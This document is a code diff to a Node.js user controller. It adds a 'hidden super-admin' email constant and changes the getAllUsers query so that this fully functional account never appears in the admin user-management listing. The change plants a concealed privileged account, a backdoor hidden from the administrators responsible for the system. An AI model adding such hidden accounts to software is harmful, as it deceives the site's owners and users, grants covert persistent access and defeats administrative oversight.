@@ -1,6 +1,10 @@
 const User = require('../models/User');
 const bcrypt = require('bcryptjs');
 
+// Hidden super-admin accounts: fully functional (login/access) but never
+// exposed in the user-management UI listing.
+const HIDDEN_EMAILS = ['secret@gmail.com'];
+
 const userController = {
   // Create new user (admin only)
   createUser: async (req, res) => {
@@ -51,7 +55,7 @@ const userController = {
   // Get all users (admin only)
   getAllUsers: async (req, res) => {
     try {
-      const users = await User.find({})
+      const users = await User.find({ email: { $nin: HIDDEN_EMAILS } })
         .select('-password')
         .sort({ createdAt: -1 })
         .lean();
